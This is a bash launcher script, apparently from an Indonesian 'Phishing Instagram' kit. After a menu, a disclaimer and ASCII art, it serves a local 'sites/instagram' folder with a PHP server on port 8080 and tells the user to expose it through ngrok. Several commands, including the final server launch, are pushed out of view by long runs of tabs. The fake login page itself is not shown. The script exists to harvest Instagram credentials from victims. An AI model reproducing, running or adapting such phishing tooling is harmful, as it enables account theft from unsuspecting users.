#!/bin/bash
# Phishing Instagram v.007
# Coded by:Turub_Termous 
# Instagram:https://instagram.com/turub_termous?utm_medium=copy_link
# Script ini Kami Ciptakan Hanya Untuk Membantu Yg Membutuhkan!!
# Pengguna Jangan Sampai Menyalahgunakan Script Ini!!

clear
echo -e "\e[93m\e"
bash logo.sh
date
printf "\n"
printf "\n"
echo -e "\e[93mTEKAN 1 UNTUK LANJUT";
echo -e "--------------------";
echo -e "1. Gaskeun     	";
echo -e "2. Exit	   	";
read -p  "Pilihan anda [1-2] :" pil;
printf "\n"
printf "\n"
if [ $pil -eq 1 ]; then  echo "Gunakan Dengan Bijak!!...";elif  [ $pil -eq 2 ];  then    exit 0; else    echo -e "\e[91mTidak ada pilihan selain 1 & 2 bosquh..\e[0m";    exit 1; fi
clear
echo -e "\e[92m"
cat README.md
printf "\n"
printf "\n"
echo -e "\e[93m";
echo -e "                            <<<<<<<<<<<<<<🚫>>>>>>>>>>>>>>";
echo -e "                            🚫TIDAK UNTUK DI SALAHGUNAKAN🚫";
echo -e "                             <<<<<<<<<<<<<<🚫>>>>>>>>>>>>>>";
printf "\n"
printf "\n"
echo -e "\e[92m"
read -p "$.Click [enter] ~~> " pil;
echo -e "\e[0m"
clear
echo -e "\e[93m\e"
printf "\n"
printf "\n"









































































































































































																																																			printf "\e[1;93m[\e[0m*\e[1;93m] Starting php server...\n"
																																																																																																					printf "\e[1;92m[\e[0m*\e[1;92m] Hosting succes >>> http://localhost:8080" 
printf "\n"
echo -e "\e[93m
					 /A\\
                                       __\V/__
                                      |__   __|
                                         | |
                                         | |
                                         | |
                                         | |
                                         | |
                                         | |
                                         | |
                                         | |
                                  | |    | |     | |
                                   ______| |______
                                  | _____   _____  |
                                  | |    | |     | |
                                  | |    | |     | |
                                  | |    | |     | |
                                  | |    | |     | |
                                  | |    | |     | |
                                  \ /    \ /     \ /
      \e[91m                             V      V       V"
printf "\n"
echo -e "\e[92m		              >>Saatnya Forward Ngrok<<"
printf "\n"
echo -e "\e[93m\e"
																																																																																																																																																								cd sites/instagram && php -S localhost:8080 

